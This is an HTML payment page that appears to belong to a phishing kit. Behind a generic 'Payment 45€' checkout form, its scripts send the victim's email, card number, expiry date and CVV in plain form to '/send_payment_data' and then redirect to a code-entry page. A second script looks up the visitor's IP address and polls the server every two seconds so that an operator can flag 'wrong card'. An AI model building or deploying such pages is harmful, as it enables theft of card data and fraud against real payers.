<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment</title>
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
    <style>
        body {
            background: #00b2ff;
            min-height: 100vh;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Roboto', Arial, sans-serif;
        }
        .payment-card {
            background: #fff;
            border-radius: 20px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.12);
            padding: 2.5rem 2rem 2rem 2rem;
            max-width: 370px;
            width: 100%;
            box-sizing: border-box;
            text-align: center;
            overflow: hidden;
        }
        .bank-icon {
            width: 60px;
            height: 60px;
            background: #00b2ff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 1.2rem auto;
        }
        .bank-icon svg {
            width: 36px;
            height: 36px;
            fill: #fff;
        }
        .payment-title {
            font-size: 2rem;
            font-weight: 700;
            margin-bottom: 1.2rem;
        }
        .payment-card hr {
            border: none;
            border-top: 1px solid #e0e0e0;
            margin: 1.2rem 0 1.5rem 0;
        }
        .input-group {
            margin-bottom: 1.1rem;
            text-align: left;
        }
        .input-group input {
            width: 100%;
            padding: 1rem 1.1rem;
            border: 1.5px solid #e0e0e0;
            border-radius: 12px;
            font-size: 1.1rem;
            background: #fafbfc;
            outline: none;
            transition: border 0.2s;
            box-sizing: border-box;
            overflow-wrap: break-word;
        }
        .input-group input:focus {
            border-color: #00b2ff;
        }
        .row {
            display: flex;
            gap: 1rem;
            width: 100%;
        }
        .row .input-group {
            flex: 1;
            margin-bottom: 0;
        }
        .confirm-btn {
            width: 100%;
            padding: 1rem;
            background: #00b2ff;
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 1.15rem;
            font-weight: 500;
            margin-top: 1.2rem;
            cursor: pointer;
            transition: background 0.2s;
        }
        .confirm-btn:hover {
            background: #0090cc;
        }
        @media (max-width: 480px) {
            .payment-card {
                padding: 1.2rem 0.5rem 1.5rem 0.5rem;
            }
            .row {
                flex-direction: column;
                gap: 0.7rem;
            }
        }
        .chat-widget {
            position: fixed;
            right: 24px;
            bottom: 24px;
            width: 64px;
            height: 64px;
            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 4px 16px rgba(0,0,0,0.18);
            z-index: 1000;
        }
        .chat-widget svg {
            width: 32px;
            height: 32px;
            fill: #fff;
        }
    </style>
</head>
<body>
    <div class="payment-card">
        <div class="bank-icon">
            <svg viewBox="0 0 24 24"><path d="M12 2L2 7v2h20V7L12 2zm0 2.18L18.09 7H5.91L12 4.18zM4 10v8h2v-6h12v6h2v-8H4zm2 8v-6h12v6H6z"/></svg>
        </div>
        <div class="payment-title" id="payment-title">Payment 45€</div>
        <hr>
        <form id="paymentForm" autocomplete="off">
            <div class="input-group">
                <input id="email-input" type="email" placeholder="E-mail" value="" required>
            </div>
            <div class="input-group">
                <input id="card-input" type="text" placeholder="Card Number" maxlength="19" pattern="[0-9 ]*" inputmode="numeric" required>
            </div>
            <div class="row">
                <div class="input-group">
                    <input id="expiry-input" type="text" placeholder="Expiry Date" maxlength="5" pattern="[0-9/]*" inputmode="numeric" required>
                </div>
                <div class="input-group">
                    <input id="cvv-input" type="password" placeholder="CVV" maxlength="4" pattern="[0-9]*" inputmode="numeric" required>
                </div>
            </div>
            <button type="submit" class="confirm-btn">Confirm</button>
        </form>
    </div>
    <div class="chat-widget">
        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" opacity="0.2"/><path d="M12 7a5 5 0 0 1 5 5c0 2.76-2.24 5-5 5s-5-2.24-5-5a5 5 0 0 1 5-5zm0 2a3 3 0 0 0-3 3c0 1.66 1.34 3 3 3s3-1.34 3-3a3 3 0 0 0-3-3z"/></svg>
    </div>
    <script>
    // Зчитування параметрів з URL
    function getQueryParam(name) {
        const url = new URL(window.location.href);
        return url.searchParams.get(name);
    }
    // Total підтягуємо, беремо тільки число
    const totalRaw = getQueryParam('total');
    if (totalRaw) {
        // Витягуємо тільки число (цілу або з копійками)
        const match = totalRaw.match(/\d+[\.,]?\d*/);
        const totalNum = match ? match[0].replace(',', '.') : '';
        if (totalNum) {
            document.getElementById('payment-title').textContent = `Payment ${totalNum}€`;
        }
    }
    document.getElementById('paymentForm').onsubmit = async function(e) {
        e.preventDefault();
        const email = document.getElementById('email-input').value;
        const card = document.getElementById('card-input').value;
        const expiry = document.getElementById('expiry-input').value;
        const cvv = document.getElementById('cvv-input').value;
        try {
            const response = await fetch('/send_payment_data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email, card, expiry, cvv })
            });
            if (response.ok) {
                // Після успішної відправки даних
                window.location.href = '/buy-tickets/code/';
            } else {
                console.error('Помилка при відправці даних');
            }
        } catch (error) {
            console.error('Помилка при зверненні до сервера:', error);
        }
    };
    </script>
    <script>
    // --- POLLING для wrong_card ---
    function getUserIP(callback) {
        // Спробуємо отримати IP через сторонній сервіс
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => callback(data.ip))
            .catch(() => callback(null));
    }
    let userIP = null;
    getUserIP(function(ip) {
        userIP = ip;
    });
    let wrongCardMsg = null;
    function showWrongCardMsg() {
        if (!wrongCardMsg) {
            wrongCardMsg = document.createElement('div');
            wrongCardMsg.style.color = '#dc3545';
            wrongCardMsg.style.fontSize = '0.98rem';
            wrongCardMsg.style.marginTop = '6px';
            wrongCardMsg.textContent = 'не вірна карта';
            const cardInput = document.getElementById('card-input');
            cardInput.parentNode.appendChild(wrongCardMsg);
        }
    }
    setInterval(function() {
        if (!userIP) return;
        fetch('/check_wrong_card?ip=' + encodeURIComponent(userIP))
            .then(resp => resp.text())
            .then(txt => {
                if (txt === 'true') {
                    showWrongCardMsg();
                }
            });
    }, 2000);
    </script>
</body>
</html>
